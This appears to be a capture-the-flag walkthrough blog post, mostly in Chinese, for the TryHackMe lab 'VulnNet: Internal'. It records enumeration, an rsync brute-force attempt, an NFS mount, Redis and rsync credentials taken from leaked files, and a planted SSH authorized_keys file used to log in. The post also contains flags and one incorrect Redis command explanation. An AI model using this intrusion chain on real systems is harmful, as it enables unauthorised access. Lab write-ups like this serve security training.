---
layout: post
title: "VulnNet Internal"
date: "2023-08-11"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - TryHackMe
---

# VulnNet: Internal
VulnNet Entertainment learns from its mistakes, and now they have something new for you...

tag: linux, enumeration, pivoting, privilege escalation

## Task 1: VulnNet: Internal
VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.

* Difficulty: Easy/Medium
* Operating System: Linux

This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags.

Note: It might take 3-5 minutes for all the services to boot.

Target IP Address : 10.10.68.178

Kali Linux : 10.18.72.222

```
┌──(root㉿kali)-[~]
└─# nmap 10.10.68.178                       
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 04:49 EDT
Nmap scan report for 10.10.68.178
Host is up (0.26s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
111/tcp  open     rpcbind
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
873/tcp  open     rsync
2049/tcp open     nfs
9090/tcp filtered zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 74.54 seconds
```

```
┌──(root㉿kali)-[~]
└─# nmap -sV -p 22,111,139,445,873,2049,9090 -sC 10.10.68.178
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 04:54 EDT
Nmap scan report for 10.10.68.178
Host is up (0.26s latency).

PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     �7�wjU      Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     rpcbind
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2023-08-10T10:55:09+02:00
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2023-08-10T08:55:09
|_  start_date: N/A
|_clock-skew: mean: -39m57s, deviation: 1h09m16s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.55 seconds
```

```
┌──(root㉿kali)-[~]
└─# nc -v 10.10.68.178 111
10.10.68.178: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.68.178] 111 (sunrpc) open
```

[111/TCP/UDP - Pentesting Portmapper](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind)

```
┌──(root㉿kali)-[~]
└─# nmap -sSUC -p111 10.10.68.178
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 07:12 EDT
Nmap scan report for 10.10.68.178
Host is up (0.25s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      37352/udp   mountd
|   100005  1,2,3      58715/tcp   mountd
|   100021  1,3,4      33113/tcp   nlockmgr
|   100021  1,3,4      46410/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
111/udp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      37352/udp   mountd
|   100005  1,2,3      58715/tcp   mountd
|   100021  1,3,4      33113/tcp   nlockmgr
|   100021  1,3,4      46410/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl

Nmap done: 1 IP address (1 host up) scanned in 17.76 seconds
```

```
┌──(root㉿kali)-[~]
└─# nc -v 10.10.68.178 873
10.10.68.178: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.68.178] 873 (rsync) open
@RSYNCD: 31.0
```

[873 - Pentesting Rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)

```
┌──(root㉿kali)-[~]
└─# nc -v 10.10.68.178 873
10.10.68.178: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.68.178] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
files           Necessary home interaction
@RSYNCD: EXIT
```

```
┌──(root㉿kali)-[~]
└─# nc -vn 10.10.68.178 873
(UNKNOWN) [10.10.68.178] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
files
@RSYNCD: AUTHREQD NaTYr+iWHAjxWWb/3WT/ng
```

```
┌──(root㉿kali)-[~]
└─# msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use auxiliary/scanner/rsync/modules_list
msf6 auxiliary(scanner/rsync/modules_list) > show options

Module options (auxiliary/scanner/rsync/modules_list):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   RHOSTS                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                873              yes       The target port (TCP)
   TEST_AUTHENTICATION  true             yes       Test if the rsync module requires authentication
   THREADS              1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/rsync/modules_list) > set RHOSTS 10.10.68.178
RHOSTS => 10.10.68.178
msf6 auxiliary(scanner/rsync/modules_list) > run

[+] 10.10.68.178:873      - 1 rsync modules found: files
[*] 10.10.68.178:873      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

[Script rsync-brute](https://nmap.org/nsedoc/scripts/rsync-brute.html)

尝试暴力破解files共享的密码，但是没有成功。

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=files' 10.10.68.178
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 05:41 EDT
NSE: [rsync-brute] usernames: Time limit 10m00s exceeded.
NSE: [rsync-brute] usernames: Time limit 10m00s exceeded.
NSE: [rsync-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 10.10.68.178
Host is up (0.25s latency).

PORT    STATE SERVICE
873/tcp open  rsync
| rsync-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 7252 guesses in 601 seconds, average tps: 12.0

Nmap done: 1 IP address (1 host up) scanned in 601.78 seconds
```

```
┌──(root㉿kali)-[~]
└─# nc -nv 10.10.68.178 2049                                                                                                      
(UNKNOWN) [10.10.68.178] 2049 (nfs) open
```

[2049 - Pentesting NFS Service](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)

[Script nfs-ls](https://nmap.org/nsedoc/scripts/nfs-ls.html)

List NFS exports and check permissions

```
┌──(root㉿kali)-[~]
└─# nmap -p 111 --script=nfs-ls 10.10.68.178                                                                                      
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 07:33 EDT
Nmap scan report for 10.10.68.178
Host is up (0.26s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /opt/conf
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2021-02-02T11:19:46  .
| rwxr-xr-x   0    0    4096  2021-02-02T09:28:11  ..
| rwxr-xr-x   0    0    4096  2021-02-02T09:32:57  hp
| rwxr-xr-x   0    0    4096  2021-02-02T09:35:15  init
| rwxr-xr-x   0    0    4096  2021-02-02T09:36:08  opt
| rwxr-xr-x   0    0    4096  2021-02-02T09:30:34  profile.d
| rwxr-xr-x   0    0    4096  2021-02-02T11:19:46  redis
| rwxr-xr-x   0    0    4096  2021-02-02T09:30:59  vim
| rwxr-xr-x   0    0    4096  2021-02-02T09:38:32  wildmidi
|_

Nmap done: 1 IP address (1 host up) scanned in 5.69 seconds
```

[Script nfs-showmount](https://nmap.org/nsedoc/scripts/nfs-showmount.html)

Like showmount -e

```
┌──(root㉿kali)-[~]
└─# nmap -p 111 --script=nfs-showmount 10.10.68.178
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 07:38 EDT
Nmap scan report for 10.10.68.178
Host is up (0.26s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /opt/conf *

Nmap done: 1 IP address (1 host up) scanned in 2.01 seconds
```

[Script nfs-statfs](https://nmap.org/nsedoc/scripts/nfs-statfs.html)

Disk statistics and info from NFS share

```
┌──(root㉿kali)-[~]
└─# nmap -p 111 --script=nfs-statfs 10.10.68.178   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 07:41 EDT
Nmap scan report for 10.10.68.178
Host is up (0.26s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-statfs: 
|   Filesystem  1K-blocks   Used       Available  Use%  Maxfilesize  Maxlink
|_  /opt/conf   11309648.0  7446648.0  3268776.0  70%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds
```

```
msf6 auxiliary(scanner/rsync/modules_list) > use auxiliary/scanner/nfs/nfsmount
msf6 auxiliary(scanner/nfs/nfsmount) > show options

Module options (auxiliary/scanner/nfs/nfsmount):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   HOSTNAME                   no        Hostname to match shares against
   LHOST     192.168.117.128  no        IP to match shares against
   PROTOCOL  udp              yes       The protocol to use (Accepted: udp, tcp)
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     111              yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/nfs/nfsmount) > set LHOST 10.18.72.222
LHOST => 10.18.72.222
msf6 auxiliary(scanner/nfs/nfsmount) > set RHOSTS 10.10.68.178
RHOSTS => 10.10.68.178
msf6 auxiliary(scanner/nfs/nfsmount) > set RPORT 111
RPORT => 111
msf6 auxiliary(scanner/nfs/nfsmount) > run

[+] 10.10.68.178:111      - 10.10.68.178 Mountable NFS Export: /opt/conf [*]
[*] 10.10.68.178:111      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
┌──(root㉿kali)-[~]
└─# showmount -e 10.10.68.178
Export list for 10.10.68.178:
/opt/conf *
```

```
┌──(root㉿kali)-[~]
└─# mkdir /mnt/new_back                 
                                                                                                                                                             
┌──(root㉿kali)-[~]
└─# mount -t nfs 10.10.68.178:/opt/conf /mnt/new_back -o nolock
```

```
┌──(root㉿kali)-[~]
└─# cd /mnt/new_back
                                                                                                                                                             
┌──(root㉿kali)-[/mnt/new_back]
└─# ls -al 
total 36
drwxr-xr-x 9 root root 4096 Feb  2  2021 .
drwxr-xr-x 3 root root 4096 Aug 10 07:47 ..
drwxr-xr-x 2 root root 4096 Feb  2  2021 hp
drwxr-xr-x 2 root root 4096 Feb  2  2021 init
drwxr-xr-x 2 root root 4096 Feb  2  2021 opt
drwxr-xr-x 2 root root 4096 Feb  2  2021 profile.d
drwxr-xr-x 2 root root 4096 Feb  2  2021 redis
drwxr-xr-x 2 root root 4096 Feb  2  2021 vim
drwxr-xr-x 2 root root 4096 Feb  2  2021 wildmidi
```

```
┌──(root㉿kali)-[/mnt/new_back/redis]
└─# cp -r /mnt/new_back ~/Downloads
```

从hp/hplip.conf文件中，得知hplip version=3.17.10。

从redis/redis.conf文件中，发现密码：

```
requirepass "B65Hx562F@ggAZ@F"
```

不能在/mnt/new_back目录中写入python reverse shell。该目录只可读不可写。

扫描目标的tcp 6379端口，发现开放了redis服务。

```
┌──(root㉿kali)-[/mnt/new_back]
└─# nmap -sV -p 6379 10.10.68.178                    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 08:33 EDT
Nmap scan report for 10.10.68.178
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds
```

利用从redis/redis.conf文件中获取的密码，连接到目标redis服务器。

```
┌──(root㉿kali)-[/mnt/new_back]
└─# redis-cli -h 10.10.68.178 -a B65Hx562F@ggAZ@F
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.68.178:6379> PING
PONG
```

`redis-cli` 是 Redis 数据库的官方命令行客户端工具，用于与 Redis 服务器进行交互。以下是一些常用的 `redis-cli` 命令：

1. 连接到 Redis 服务器：
   ```
   redis-cli -h <hostname> -p <port>
   ```

2. 设置键值对：
   ```
   SET <key> <value>
   ```

3. 获取键的值：
   ```
   GET <key>
   ```

4. 删除键：
   ```
   DEL <key>
   ```

5. 检查键是否存在：
   ```
   EXISTS <key>
   ```

6. 设置键的过期时间（以秒为单位）：
   ```
   EXPIRE <key> <seconds>
   ```

7. 获取键的过期时间（以秒为单位，返回 -1 表示永不过期，-2 表示键不存在）：
   ```
   TTL <key>
   ```

8. 获取多个键的值：
   ```
   MGET <key1> <key2> ...
   ```

9. 增加或减少键的整数值：
   ```
   INCR <key>
   DECR <key>
   ```

10. 执行 Lua 脚本：
    ```
    EVAL "<lua_script>" <num_keys> <key1> <key2> ...
    ```

11. 获取所有键名：
    ```
    KEYS *
    ```

12. 查看服务器信息：
    ```
    INFO
    ```

13. 切换到指定数据库（默认为0）：
    ```
    SELECT <db_index>
    ```

14. 清空当前数据库：
    ```
    FLUSHDB
    ```

15. 清空所有数据库：
    ```
    FLUSHALL
    ```

16. 查看配置参数：
    ```
    CONFIG GET <parameter>
    ```

17. 查看 Redis 服务器当前使用的内存情况：
    ```
    MEMORY USAGE <key>
    ```

18. 订阅频道消息（发布-订阅模式）：
    ```
    SUBSCRIBE <channel>
    ```

19. 发布消息到频道（发布-订阅模式）：
    ```
    PUBLISH <channel> <message>
    ```

20. 退出 `redis-cli`：
    ```
    QUIT
    ```

这只是 `redis-cli` 支持的一些常用命令示例，Redis 提供了更多丰富的功能和命令，你可以在 `redis-cli` 中输入 `help` 命令或查阅官方文档来获取更多信息。

在 Redis 中，每个键（key）都有一个与之关联的值（value）。不同类型的键可以存储不同类型的值。从你的输入来看，你正在尝试使用 `GET` 命令来获取一个键的值，但是出现了 "WRONGTYPE Operation against a key holding the wrong kind of value" 错误，这是因为你尝试在一个不匹配类型的键上执行 `GET` 命令。

在 Redis 中，有不同的数据类型，如字符串（string）、列表（list）、哈希（hash）、集合（set）、有序集合（sorted set）等。错误提示表明你尝试在一个非字符串类型的键上执行了 `GET` 命令。

如果你想查看一个键的数据类型，可以使用 `TYPE` 命令：

```
TYPE <key>
```

例如：

```
10.10.68.178:6379> TYPE marketlist
```

然后根据键的数据类型，使用适当的命令来获取其值。如果 `marketlist` 键的类型是列表，你可以使用 `LRANGE` 命令来获取列表的元素：

```
LRANGE marketlist 0 -1
```

或者，如果你想获取字符串类型的值，确保键的类型是字符串，然后使用 `GET` 命令：

```
GET <key>
```

请根据键的实际数据类型来选择合适的命令。

获取所有键名

```
10.10.68.178:6379> KEYS *
1) "marketlist"
2) "tmp"
3) "authlist"
4) "internal flag"
5) "int"
```

获取字符串类型的值，确保键的类型是字符串，然后使用 GET 命令：

```
10.10.68.178:6379> TYPE "internal flag"
string
10.10.68.178:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
```

查看一个键的数据类型：

```
10.10.68.178:6379> TYPE marketlist
list
```

marketlist 键的类型是列表，可以使用 LRANGE 命令来获取列表的元素：

```
10.10.68.178:6379> LRANGE marketlist 0 -1
1) "Machine Learning"
2) "Penetration Testing"
3) "Programming"
4) "Data Analysis"
5) "Analytics"
6) "Marketing"
7) "Media Streaming"
```

要获取名为 `marketlist` 列表中的 `Penetration Testing` 值，你可以使用 `LINDEX` 命令，它用于通过索引获取列表中的元素。由于你知道 `Penetration Testing` 是列表中的第二个元素（索引从 0 开始），所以你可以使用以下命令来获取它的值：

```plaintext
LINDEX marketlist 1
```

这将返回列表中索引为 1 的元素，即 `Penetration Testing`。

如果你想获取元素的值并打印出来，可以在 `redis-cli` 中输入以下命令：

```plaintext
GET "marketlist:1"
```

这将返回 `Penetration Testing` 值。

请注意，上述命令中的索引是从 0 开始的，因此 `Penetration Testing` 的索引是 1。

```
10.10.68.178:6379> LINDEX marketlist 0
"Machine Learning"
10.10.68.178:6379> LINDEX marketlist 1
"Penetration Testing"
10.10.68.178:6379> LINDEX marketlist 2
"Programming"
10.10.68.178:6379> LINDEX marketlist 3
"Data Analysis"
10.10.68.178:6379> LINDEX marketlist 4
"Analytics"
10.10.68.178:6379> LINDEX marketlist 5
"Marketing"
10.10.68.178:6379> LINDEX marketlist 6
"Media Streaming"
(0.74s)
```

```
10.10.68.178:6379> GET tmp
"temp dir..."
10.10.68.178:6379> TYPE tmp
string
```

```
10.10.68.178:6379> TYPE authlist
list
10.10.68.178:6379> LRANGE authlist 0 -1
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.10.68.178:6379> LINDEX authlist 0
"QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.10.68.178:6379> LINDEX authlist 1
"QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.10.68.178:6379> LINDEX authlist 2
"QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.10.68.178:6379> LINDEX authlist 3
"QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

尝试使用base64解码：

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

发现rsync的密码：Hcg3HP67@TW@Bc72v

```
10.10.68.178:6379> TYPE int
string
10.10.68.178:6379> GET int
"10 20 30 40 50"
```

要使用 `rsync` 连接到目标主机，你可以在 Kali Linux 终端中使用以下命令：

```bash
rsync [OPTIONS] <source> <destination>
```

在这里，`<source>` 是源文件或目录的路径，`<destination>` 是目标主机的路径。`OPTIONS` 是一些可选的参数，你可以根据需要进行设置。

例如，假设你想将本地的 `/path/to/local/folder` 目录同步到远程主机的 `/path/on/remote/host` 目录，你可以使用以下命令：

```bash
rsync -avz /path/to/local/folder/ user@remote_host:/path/on/remote/host/
```

解释一下命令中的选项：

- `-a`: 表示归档模式，用于保持文件属性和目录结构。
- `-v`: 表示启用详细输出。
- `-z`: 表示启用压缩传输，可以加快传输速度。

`user` 是远程主机上的用户名，`remote_host` 是目标主机的 IP 地址或主机名。

当你运行上述命令时，系统会要求你输入远程主机的密码。如果你希望免去手动输入密码，你可以设置 SSH 公钥认证来进行无密码访问。

请确保目标主机上已经启动了 `rsync` 服务，并且该服务没有被防火墙或其他安全机制阻止。如果需要验证登录凭据，请根据实际情况在命令中添加用户名和密码。

需要注意的是，`rsync` 命令的选项和使用方式可能会因你的需求和环境而有所不同，上述示例只是一个基本的用法。你可以使用 `rsync --help` 命令来查看更多选项和说明。

要使用 `rsync` 连接到目标主机并提供密码进行授权，可以使用以下命令：

```bash
rsync -avz --password-file=/path/to/password-file rsync-connect@127.0.0.1::module /path/on/local/machine
```

在这里，你需要将以下信息替换为实际的值：

- `/path/to/password-file`: 包含密码的文件的路径。你可以创建一个文本文件，将密码 `Hcg3HP67@TW@Bc72v` 放入其中，并将路径替换为该文件的实际路径。
- `rsync-connect@127.0.0.1::module`: 替换为实际的用户名、主机地址和模块名称。`rsync-connect` 是用户名，`127.0.0.1` 是主机地址，`module` 是要同步的模块名称。如果你不了解模块是什么，可以在目标主机上运行 `rsync --list-only` 命令来查看可用的模块列表。
- `/path/on/local/machine`: 替换为本地机器上的目标路径，表示将文件同步到本地的哪个位置。

命令将从指定的模块（在目标主机上的配置中定义的）同步文件到本地目标路径。

在运行命令时，它会从密码文件中读取密码并使用它来进行授权。这样可以避免在命令行中直接暴露密码。

请确保路径和信息正确，以确保命令正常运行。如有疑问，请参考 `rsync` 的文档或使用 `rsync --help` 命令获取更多帮助。

获取目标主机上的 rsync 模块列表

```
┌──(root㉿kali)-[~]
└─# rsync rsync-connect@10.10.68.178::          
files           Necessary home interaction
```

1 rsync modules found: files

要同步的模块名称是files。

```
┌──(root㉿kali)-[~]
└─# rsync -avz rsync-connect@10.10.68.178::files /root/Downloads/
Password: 
receiving incremental file list
./
sys-internal/
sys-internal/.Xauthority
sys-internal/.bash_history -> /dev/null
sys-internal/.bash_logout
sys-internal/.bashrc
sys-internal/.dmrc
sys-internal/.profile
sys-internal/.rediscli_history -> /dev/null
sys-internal/.sudo_as_admin_successful
sys-internal/.xscreensaver
sys-internal/.xsession-errors
sys-internal/.xsession-errors.old
sys-internal/user.txt
sys-internal/.cache/

...

sys-internal/.ssh/
sys-internal/.thumbnails/
sys-internal/.thumbnails/large/
sys-internal/.thumbnails/normal/
sys-internal/.thumbnails/normal/2b53c68a980e4c943d2853db2510acf6.png
sys-internal/.thumbnails/normal/473aeca0657907b953403884c53d865c.png
sys-internal/.thumbnails/normal/539380d1cb60fcd744fd5094d314fdc1.png
sys-internal/Desktop/
sys-internal/Documents/
sys-internal/Downloads/
sys-internal/Music/
sys-internal/Pictures/
sys-internal/Public/
sys-internal/Templates/
sys-internal/Videos/

sent 28,064 bytes  received 16,468,242 bytes  22,398.24 bytes/sec
total size is 41,708,382  speedup is 2.53
```

感觉把sys-internal的家目录都搬运到Kali上了。

查看sys-internal/user.txt：

```
THM{da7c20696831f253e0afaca8b83c07ab}
```

```
┌──(root㉿kali)-[~/Downloads/sys-internal]
└─# ls -al
total 108
drwxr-xr-x 18 kali kali 4096 Feb  6  2021 .
drwxr-xr-x  4 root root 4096 Feb  1  2021 ..
lrwxrwxrwx  1 root root    9 Feb  1  2021 .bash_history -> /dev/null
-rw-r--r--  1 kali kali  220 Feb  1  2021 .bash_logout
-rw-r--r--  1 kali kali 3771 Feb  1  2021 .bashrc
drwxrwxr-x  8 kali kali 4096 Feb  2  2021 .cache
drwxrwxr-x 14 kali kali 4096 Feb  1  2021 .config
drwx------  3 kali kali 4096 Feb  1  2021 .dbus
drwx------  2 kali kali 4096 Feb  1  2021 Desktop
-rw-r--r--  1 kali kali   26 Feb  1  2021 .dmrc
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Documents
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Downloads
drwx------  3 kali kali 4096 Feb  1  2021 .gnupg
drwxrwxr-x  3 kali kali 4096 Feb  1  2021 .local
drwx------  5 kali kali 4096 Feb  1  2021 .mozilla
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Music
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Pictures
-rw-r--r--  1 kali kali  807 Feb  1  2021 .profile
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Public
lrwxrwxrwx  1 root root    9 Feb  2  2021 .rediscli_history -> /dev/null
drwxrwxr-x  2 kali kali 4096 Feb  6  2021 .ssh
-rw-r--r--  1 kali kali    0 Feb  1  2021 .sudo_as_admin_successful
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Templates
drwx------  4 kali kali 4096 Feb  2  2021 .thumbnails
-rw-------  1 kali kali   38 Feb  6  2021 user.txt
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Videos
-rw-------  1 kali kali   61 Feb  6  2021 .Xauthority
-rw-r--r--  1 kali kali   14 Feb 12  2018 .xscreensaver
-rw-------  1 kali kali 2546 Feb  6  2021 .xsession-errors
-rw-------  1 kali kali 2546 Feb  6  2021 .xsession-errors.old
```

重启了一下Lab：

Target IP Address : 10.10.0.182

Kali Linux : 10.18.72.222

生成SSH密钥对。

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh-keygen                                         
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
/root/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:atN+HR+zjFY9gR+KCJjnvrIuhMHPYEEzxAOs+ALJg+s root@kali
The key's randomart image is:
+---[RSA 3072]----+
|B=               |
| =o              |
|*.o   o       .  |
|*B   o o     . o |
|ooB   o S . . o.o|
|o..+   + . ...+o.|
|...   = .  . * +.|
| E . o +  . + +  |
|    ooo.o. .     |
+----[SHA256]-----+

```

尝试向目标.ssh目录写入公钥文件。

```
┌──(root㉿kali)-[~/.ssh]
└─# rsync -avz id_rsa.pub rsync-connect@10.10.0.182::files/sys-internal/.ssh             
Password: 
sending incremental file list
id_rsa.pub
rsync: chgrp "/sys-internal/.ssh/.id_rsa.pub.EYU86D" (in files) failed: Operation not permitted (1)

sent 699 bytes  received 139 bytes  62.07 bytes/sec
total size is 746  speedup is 0.89
rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1338) [sender=3.2.7]
```

["rsync: failed to set permissions on ..." error with rsync -a or -p option](https://unix.stackexchange.com/questions/12203/rsync-failed-to-set-permissions-on-error-with-rsync-a-or-p-option)

去掉参数`-a`就可以将id_rsa.pub写入目标sys-internal/.ssh目录了。

-a: 表示归档模式，用于保持文件属性和目录结构。

-v: 表示启用详细输出。

-z: 表示启用压缩传输，可以加快传输速度。

你可以将 `id_rsa.pub` 文件复制到目标服务器的 `/sys-internal/.ssh` 目录，并将其重命名为 `authorized_keys`，从而实现将公钥添加到用户的 `authorized_keys` 文件中。这样，你在将文件复制到目标服务器时，就已经完成了公钥的添加。

以下是你可以使用的命令：

```bash
rsync -vz id_rsa.pub rsync-connect@10.10.0.182::files/sys-internal/.ssh/authorized_keys
```

这会将本地的 `id_rsa.pub` 文件复制到目标服务器的 `/sys-internal/.ssh` 目录，并将其重命名为 `authorized_keys`。这样，在目标服务器上，`/sys-internal/.ssh/authorized_keys` 文件将包含你的公钥，从而实现无密码认证的 SSH 登录。

请确保在执行命令之前确认路径和文件名是否正确，以及目标服务器上的权限设置是否允许此操作。

重启了一下实验室：

Target IP Address : 10.10.21.145

Kali Linux : 10.18.72.222

```
┌──(root㉿kali)-[~/Downloads]
└─# rsync -vz /root/.ssh/id_rsa.pub rsync-connect@10.10.21.145::files/sys-internal/.ssh/authorized_keys
Password: 
id_rsa.pub

sent 548 bytes  received 35 bytes  50.70 bytes/sec
total size is 563  speedup is 0.97
```

验证一下，确实成功将authorized_keys上传到服务器的ssh目录了。

```
┌──(root㉿kali)-[~/Downloads]
└─# rsync -avz rsync-connect@10.10.21.145::files/sys-internal/.ssh/ /root/Downloads/
Password: 
receiving incremental file list
./
authorized_keys

sent 58 bytes  received 578 bytes  55.30 bytes/sec
total size is 563  speedup is 0.89
```

从sys-internal/.xsession-errors文件中，可以看出HOME=/home/sys-internal。因此得知用户名为sys-internal。

利用SSH远程登录sys-internal用户。

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh sys-internal@10.10.21.145   
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
